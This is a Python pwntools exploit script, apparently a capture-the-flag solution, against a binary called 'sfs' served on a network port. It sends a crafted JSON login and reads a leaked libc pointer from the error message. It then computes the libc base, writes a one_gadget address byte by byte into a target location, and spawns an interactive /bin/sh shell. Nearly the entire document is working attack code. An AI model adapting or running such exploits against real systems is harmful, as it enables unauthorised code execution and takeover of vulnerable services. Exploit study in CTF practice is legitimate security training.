#-*- coding:utf-8 –*-
from pwn import *
context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')
#log_level=['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
elfFileName = "./sfs"
libcFileName = ""
ip = "0.0.0.0"
port = 10003

Debug = 0
if Debug:
    io = process(elfFileName)
    #gdb.attach(io)
else:
    io = remote(ip,port)

#
io.recvuntil('passwd.\n')
#{"name":"spring","passwd":"spring"}
payload = '{"name":"spring","passwd":"spring"}'
io.sendline(payload)
io.recvuntil('logger:spring login error!\nlogger:')
lib_main = u64(io.recvuntil(' login', drop=True).ljust(8, '\x00'))
print 'lib_main_arena is ',hex(lib_main)
libc_base = lib_main - 88 - 0x3c4b20
print 'libc_base is ',hex(libc_base)
#
target = libc_base + 0x8f9f48#0x3f1000+0xf08#0x5f0f48
one_gadget = libc_base + 0xf02a4#0xf1147#0x4526a#0x45216#0xf02a4

print 'target is ',hex(target)
print 'one_gadget is ',hex(one_gadget)

sleep(0.1)
for i in range(3):
	io.send(p64(target + i))
	sleep(0.1)
	io.send(p64(one_gadget)[i])
	sleep(0.1)

#io.recv()
io.sendline("exec /bin/sh")#1>&0")

io.interactive()
